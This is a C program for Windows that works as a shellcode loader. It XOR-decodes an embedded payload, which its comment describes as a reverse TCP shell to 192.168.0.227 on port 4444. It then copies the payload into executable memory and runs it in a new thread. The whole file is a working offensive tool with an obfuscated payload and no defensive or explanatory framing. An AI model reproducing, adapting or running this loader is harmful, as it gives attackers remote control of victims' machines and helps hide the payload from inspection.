#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
int main(int argc, char* argv[]){
    
    HANDLE hProc = GetCurrentProcess();


    if (hProc == NULL){
        printf("[*] Failed to obtain handle, exiting...");
        return 0;
    }
    printf("[*] Obtained handle: %x\n", hProc);

	unsigned char key = '\x69'; // if payload isnt xor encrypted, set key to \x00

	unsigned char shellcode[] = //payload - reverse tcp to 192.168.0.227:4444
		"\x95\x21\xea\x8d\x99\x81\xa9\x69\x69\x69\x28\x38\x28\x39\x3b\x38\x3f\x21\x58\xbb\x0c\x21\xe2\x3b\x09\x21\xe2\x3b\x71\x21\xe2\x3b\x49\x21\xe2\x1b\x39\x21\x66\xde\x23\x23\x24\x58\xa0\x21\x58\xa9\xc5\x55\x08\x15\x6b\x45\x49\x28\xa8\xa0\x64\x28\x68\xa8\x8b\x84\x3b\x28\x38\x21\xe2\x3b\x49\xe2\x2b\x55\x21\x68\xb9\xe2\xe9\xe1\x69\x69\x69\x21\xec\xa9\x1d\x0e\x21\x68\xb9\x39\xe2\x21\x71\x2d\xe2\x29\x49\x20\x68\xb9\x8a\x3f\x21\x96\xa0\x28\xe2\x5d\xe1\x21\x68\xbf\x24\x58\xa0\x21\x58\xa9\xc5\x28\xa8\xa0\x64\x28\x68\xa8\x51\x89\x1c\x98\x25\x6a\x25\x4d\x61\x2c\x50\xb8\x1c\xb1\x31\x2d\xe2\x29\x4d\x20\x68\xb9\x0f\x28\xe2\x65\x21\x2d\xe2\x29\x75\x20\x68\xb9\x28\xe2\x6d\xe1\x21\x68\xb9\x28\x31\x28\x31\x37\x30\x33\x28\x31\x28\x30\x28\x33\x21\xea\x85\x49\x28\x3b\x96\x89\x31\x28\x30\x33\x21\xe2\x7b\x80\x3e\x96\x96\x96\x34\x20\xd7\x1e\x1a\x5b\x36\x5a\x5b\x69\x69\x28\x3f\x20\xe0\x8f\x21\xe8\x85\xc9\x68\x69\x69\x20\xe0\x8c\x20\xd5\x6b\x69\x78\x35\xa9\xc1\x69\x8a\x28\x3d\x20\xe0\x8d\x25\xe0\x98\x28\xd3\x25\x1e\x4f\x6e\x96\xbc\x25\xe0\x83\x01\x68\x68\x69\x69\x30\x28\xd3\x40\xe9\x02\x69\x96\xbc\x39\x39\x24\x58\xa0\x24\x58\xa9\x21\x96\xa9\x21\xe0\xab\x21\x96\xa9\x21\xe0\xa8\x28\xd3\x83\x66\xb6\x89\x96\xbc\x21\xe0\xae\x03\x79\x28\x31\x25\xe0\x8b\x21\xe0\x90\x28\xd3\xf0\xcc\x1d\x08\x96\xbc\x21\xe8\xad\x29\x6b\x69\x69\x20\xd1\x0a\x04\x0d\x69\x69\x69\x69\x69\x28\x39\x28\x39\x21\xe0\x8b\x3e\x3e\x3e\x24\x58\xa9\x03\x64\x30\x28\x39\x8b\x95\x0f\xae\x2d\x4d\x3d\x68\x68\x21\xe4\x2d\x4d\x71\xaf\x69\x01\x21\xe0\x8f\x3f\x39\x28\x39\x28\x39\x28\x39\x20\x96\xa9\x28\x39\x20\x96\xa1\x24\xe0\xa8\x25\xe0\xa8\x28\xd3\x10\xa5\x56\xef\x96\xbc\x21\x58\xbb\x21\x96\xa3\xe2\x67\x28\xd3\x61\xee\x74\x09\x96\xbc\xd2\x89\x74\x43\x63\x28\xd3\xcf\xfc\xd4\xf4\x96\xbc\x21\xea\xad\x41\x55\x6f\x15\x63\xe9\x92\x89\x1c\x6c\xd2\x2e\x7a\x1b\x06\x03\x69\x30\x28\xe0\xb3\x96\xbc";
	int shellcodesize=460;

	for (int i = 0; i < shellcodesize; i++){
		shellcode[i]=shellcode[i]^key;
	}



    LPVOID addr_pointer = VirtualAllocEx( // allocate the needed memory
		hProc,
		NULL,
		shellcodesize,
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE
	);

	printf("[*] Pointer to allocated memory: %x\n", addr_pointer);

    sleep(1);

	bool res = WriteProcessMemory(
		hProc,
		addr_pointer,
		shellcode,
		shellcodesize,
		NULL
	);
	if (res==0){
		printf("something got fucked, exiting...");
		return 0;
	}
	printf("[*] Memory allocated succesfully\n");

    sleep(1);

	HANDLE hThread = CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE) addr_pointer,
		NULL,
		0,
		NULL
	);

    WaitForSingleObject(hThread, INFINITE);



	printf("[*] Shellcode injected, exiting...");



    return 0;

}

